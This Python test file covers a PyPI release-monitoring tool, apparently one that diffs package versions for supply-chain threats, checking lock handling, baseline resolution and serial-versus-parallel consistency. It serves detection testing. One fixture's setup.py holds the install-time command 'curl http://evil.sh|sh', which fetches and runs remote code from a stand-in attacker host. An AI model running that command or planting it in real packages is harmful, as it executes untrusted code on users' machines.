"""Concurrency invariants for the parallel-fetch tick (orchestrator.run_once with fetch_concurrency>1).
Fetch is parallelized but results are consumed in ascending-serial order on the main thread, so the
observable outcome (stages, alerts, cursor, baseline selection) must be IDENTICAL to serial."""
import dataclasses, fcntl
from pydiffwatch import ingest, fetcher, orchestrator, store
from pydiffwatch.config import Config
from pydiffwatch.models import NewRelease
from tests.fixtures.build_fixtures import make_sdist


def test_lock_contention_prints_actionable_message(tmp_path, capsys):
    # When another run holds the lock, run_once must exit cleanly (rc 0) with a verbose message that
    # names the lock file and the holder, and tells the user how to recover from a hung run.
    cfg = Config(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "cache",
                 lock_path=tmp_path / "lock", reviewer_enabled=False)
    cfg.lock_path.parent.mkdir(parents=True, exist_ok=True)
    holder = open(cfg.lock_path, "a+")                       # simulate a scan already running
    fcntl.flock(holder, fcntl.LOCK_EX | fcntl.LOCK_NB)
    holder.write("pid=99999 since=2026-06-05T00:00:00+00:00"); holder.flush()
    try:
        rc = orchestrator.run_once(cfg, seed_if_fresh=False)
    finally:
        fcntl.flock(holder, fcntl.LOCK_UN); holder.close()
    out = capsys.readouterr().out
    assert rc == 0
    assert "already running" in out
    assert str(cfg.lock_path) in out                         # tells them WHERE the lock is
    assert "pid=99999" in out                                # and WHO holds it
    assert "does NOT release a live lock" in out             # recovery guidance for a hung run

BENIGN = make_sdist({"setup.py": b"from setuptools import setup\nsetup(name='v')\n",
                     "v/__init__.py": b"VERSION='1.0'\n"})
MALICIOUS = make_sdist({"setup.py": b"import os\nos.system('curl http://evil.sh|sh')\n",
                        "v/__init__.py": b"VERSION='1.1'\n"})
SAFE = make_sdist({"setup.py": b"from setuptools import setup\nsetup(name='s')\n",
                   "s/__init__.py": b"def add(a, b):\n    return a + b\n"})


def _wire(monkeypatch, releases, blobs):
    monkeypatch.setattr(ingest, "changes_since", lambda cfg, since: [r for r in releases if r.serial > since])
    # synthesize each package's PyPI version history from the blob keys (ascending upload time)
    from collections import defaultdict
    vers = defaultdict(list)
    for (pkg, ver) in blobs:
        vers[pkg].append(ver)
    metas = {pkg: {"releases": {v: [{"packagetype": "sdist", "url": f"mock://{pkg}/{v}",
                    "upload_time_iso_8601": f"2026-01-{i + 1:02d}T00:00:00Z", "yanked": False}]
                    for i, v in enumerate(sorted(vlist))}}
             for pkg, vlist in vers.items()}
    monkeypatch.setattr(fetcher, "_package_json", lambda pkg, cfg: metas[pkg])
    monkeypatch.setattr(fetcher, "_download",
                        lambda url, cfg: blobs[tuple(url.replace("mock://", "").split("/"))])


def test_baseline_comes_from_pypi_not_db(tmp_cfg, monkeypatch):
    # Two versions of one package in a single batch, fetched concurrently. The baseline is resolved
    # from PyPI's version history (not our DB / batch order): v1.1 diffs against v1.0, while v1.0 is
    # itself a genuinely new package (no earlier PyPI version).
    rels = [NewRelease("victim", "1.0", 10), NewRelease("victim", "1.1", 11)]
    blobs = {("victim", "1.0"): BENIGN, ("victim", "1.1"): MALICIOUS}
    _wire(monkeypatch, rels, blobs)
    cfg = dataclasses.replace(tmp_cfg, fetch_concurrency=4)   # both in one window, fetched concurrently

    orchestrator.run_once(cfg, seed_if_fresh=False)
    conn = store.connect(cfg)
    rows = dict(((p, v), (fr, pr)) for p, v, fr, pr in conn.execute(
        "SELECT package, version, is_first_release, prior_version FROM releases").fetchall())
    assert rows[("victim", "1.1")] == (0, "1.0")   # update -> diffs against PyPI predecessor
    assert rows[("victim", "1.0")] == (1, None)    # only PyPI version -> genuinely new package
    conn.close()


def _snapshot(cfg):
    conn = store.connect(cfg)
    stages = {k: v for k, v in conn.execute(
        "SELECT package || '@' || version, stage FROM releases").fetchall()}
    alerts = sorted(tuple(a) for a in conn.execute(
        """SELECT r.package, r.version, a.classification
           FROM alerts a JOIN releases r ON r.id=a.release_id""").fetchall())
    cursor = store.get_last_serial(conn)
    conn.close()
    return stages, alerts, cursor


def test_concurrency_outcome_matches_serial(tmp_path, monkeypatch):
    # Same mocked batch through a serial tick (fetch_concurrency=1) and a parallel one (=8) must
    # produce identical stages, alerts, and cursor.
    rels = [NewRelease("victim", "1.0", 10), NewRelease("victim", "1.1", 11),
            NewRelease("safe", "1.0", 12), NewRelease("other", "2.0", 13)]
    blobs = {("victim", "1.0"): BENIGN, ("victim", "1.1"): MALICIOUS,
             ("safe", "1.0"): SAFE, ("other", "2.0"): MALICIOUS}

    def run_at(conc, sub):
        cfg = Config(db_path=sub / "db.sqlite", cache_dir=sub / "cache", lock_path=sub / "lock",
                     reviewer_enabled=False, fetch_concurrency=conc)
        _wire(monkeypatch, rels, blobs)
        orchestrator.run_once(cfg, seed_if_fresh=False)
        return _snapshot(cfg)

    serial = run_at(1, tmp_path / "serial")
    parallel = run_at(8, tmp_path / "parallel")
    assert serial == parallel
    assert serial[2] == 13                                   # cursor advanced to the last serial
    assert ("victim", "1.1", "suspicious-heuristic") in serial[1]   # malicious update alerted
    assert ("safe", "1.0") not in [(p, v) for (p, v, _) in serial[1]]   # benign silent
